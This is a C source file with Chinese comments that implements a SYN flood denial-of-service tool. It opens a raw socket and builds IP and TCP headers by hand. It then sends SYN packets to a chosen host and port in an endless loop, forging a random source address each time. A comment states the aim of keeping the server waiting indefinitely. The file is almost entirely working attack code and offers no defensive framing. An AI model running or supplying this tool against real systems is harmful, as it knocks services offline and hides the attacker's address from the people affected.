#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>

//自己写的攻击函数
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport);

unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char** argv){
        int skfd;
        struct sockaddr_in target;
        struct hostent *host;
        const int on=1;
        unsigned short srcport;

        if(argc!=4)
        {
            printf("Usage:%s target dstport srcport\n",argv[0]);
            exit(1);
        }
		
        bzero(&target,sizeof(struct sockaddr_in));
        target.sin_family=AF_INET;
        target.sin_port=htons(atoi(argv[2]));

        if(inet_aton(argv[1],&target.sin_addr)==0)
        {
                host=gethostbyname(argv[1]);
                if(host==NULL)
                {
                        printf("TargetName Error:%s\n",hstrerror(h_errno));
                        exit(1);
                }
                target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
        }
        //将协议字段置为IPPROTO_TCP，来创建一个TCP的原始套接字
        if(0>(skfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))){
                perror("Create Error");
                exit(1);
        }
        //用模板代码来开启IP_HDRINCL特性，我们完全自己手动构造IP报文
         if(0>setsockopt(skfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))){
                perror("IP_HDRINCL failed");
                exit(1);
        }


        setuid(getpid());
        srcport = atoi(argv[3]);
        attack(skfd,&target,srcport);
}
//在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
        char buf[128]={0};
        struct ip *ip;
        struct tcphdr *tcp;
        int ip_len;
        //在我们TCP的报文中Data没有字段，所以整个IP报文的长度
        ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
        //开始填充IP首部
        ip=(struct ip*)buf;
        ip->ip_v = IPVERSION;//4位版本
        ip->ip_hl = sizeof(struct ip)>>2;//4为首部长度
        ip->ip_tos = 0;//8位服务类型
        ip->ip_len = htons(ip_len);//16位总长度
        ip->ip_id=0;//16位标识
        ip->ip_off=0;//13位片偏移
        ip->ip_ttl=MAXTTL;//8位TTL
        ip->ip_p=IPPROTO_TCP;//8位协议
        ip->ip_sum=0;//16位首部检验和
        ip->ip_dst=target->sin_addr;//32位目的IP地址
        //开始填充TCP首部
        tcp = (struct tcphdr*)(buf+sizeof(struct ip));
        tcp->source = htons(srcport); //16位源端口号
        tcp->dest = target->sin_port;//16位目的端口号
        tcp->seq = random();
        tcp->doff = 5;//tcp头长度
        tcp->syn = 1;
        tcp->check = 0;//16位检验和

        while(1){
                //源地址伪造，我们随便任意生成个地址，让服务器一直等待下去
                ip->ip_src.s_addr = random();
                tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
                sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
        }
}

//tcp头检验和计算算法
unsigned short check_sum(unsigned short *addr,int len){
        register int nleft=len;
        register int sum=0;
        register short *w=addr;
        short answer=0;

        while(nleft>1)
        {
                sum+=*w++;
                nleft-=2;
        }
        if(nleft==1)
        {
                *(unsigned char *)(&answer)=*(unsigned char *)w;
                sum+=answer;
        }

        sum=(sum>>16)+(sum&0xffff);
        sum+=(sum>>16);
        answer=~sum;
        return(answer);
}

